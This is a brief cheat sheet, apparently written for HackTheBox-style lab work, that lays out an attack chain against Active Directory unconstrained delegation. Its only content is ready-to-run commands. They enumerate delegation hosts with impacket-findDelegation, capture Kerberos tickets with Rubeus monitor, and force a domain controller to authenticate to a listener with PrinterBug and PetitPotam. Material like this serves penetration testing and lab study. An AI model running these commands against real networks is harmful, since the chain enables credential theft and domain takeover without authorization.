# Find unconstrained delegation computers
```
impacket-findDelegation domain.htb/user:pass -dc-ip DCIP
```

# Monitor for TGTs (Rubeus on Windows)
```
.\Rubeus.exe monitor /interval:5 /nowrap
```

# Coerce authentication (PrinterBug/PetitPotam)

```
python3 printerbug.py domain.htb/user:pass@TARGET_DC {LISTENERIP}
```

```
python3 PetitPotam.py {LISTENERIP} {DCIP}
```
